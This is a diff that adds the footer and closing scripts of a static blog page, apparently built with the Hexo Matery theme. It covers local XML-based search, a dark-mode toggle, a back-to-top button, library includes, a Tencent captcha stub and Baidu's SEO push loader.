+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
